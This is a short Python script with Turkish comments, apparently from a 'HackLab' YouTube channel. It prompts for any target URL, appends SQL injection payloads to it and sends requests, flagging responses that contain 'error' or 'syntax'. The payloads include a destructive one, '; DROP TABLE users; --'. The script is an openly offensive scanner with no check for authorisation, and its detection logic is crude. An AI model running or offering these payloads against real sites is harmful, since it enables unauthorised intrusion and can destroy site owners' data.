import os
import requests
import pyfiglet

# Renk kodları
BLUE = "\033[94m"    # Mavi (Ha)
RED = "\033[91m"     # Kırmızı (ckL)
GREEN = "\033[92m"   # Yeşil (ab)
YELLOW = "\033[93m"  # Sarı
RESET = "\033[0m"    # Sıfırlama

# HackLab başlığı
def hacklab_banner():
    ascii_banner = pyfiglet.figlet_format("HackLab")
    print(BLUE + ascii_banner)
    print(GREEN + "Youtube: HackLab" + RESET)

# Ekran temizleme fonksiyonu
def clear_screen():
    os.system('clear')

# Kullanıcıdan hedef siteyi al
def get_target_site():
    site = input(YELLOW + "Hedef URL'yi gir (Örnek: http://example.com/page.php?id=1): " + RESET)
    return site

# SQL Injection test fonksiyonu
def sql_injection_test(url):
    payloads = [
        "' OR 1=1 --",      # Genel SQL injection payload
        '" OR "a"="a',      # Farklı bir SQL payload
        "'; DROP TABLE users; --"  # Tablo silme komutu (dikkat et!)
    ]
    
    # Her payload ile isteği test et
    for payload in payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            
            # Yanıtı kontrol et
            if "error" in response.text or "syntax" in response.text:
                print(RED + f"Potansiyel SQL Injection tespit edildi: {test_url}" + RESET)
            else:
                print(GREEN + f"İstek başarılı: {test_url}" + RESET)
        except Exception as e:
            print(RED + f"Bir hata oluştu: {e}" + RESET)

# Ana fonksiyon
def main():
    clear_screen()
    hacklab_banner()  # HackLab bannerını yazdır
    target_site = get_target_site()  # Hedef siteyi al
    print(f"{YELLOW}Hedef site: {target_site}{RESET}")
    sql_injection_test(target_site)  # SQL injection testi yap

# Programı çalıştır
if __name__ == "__main__":
    main()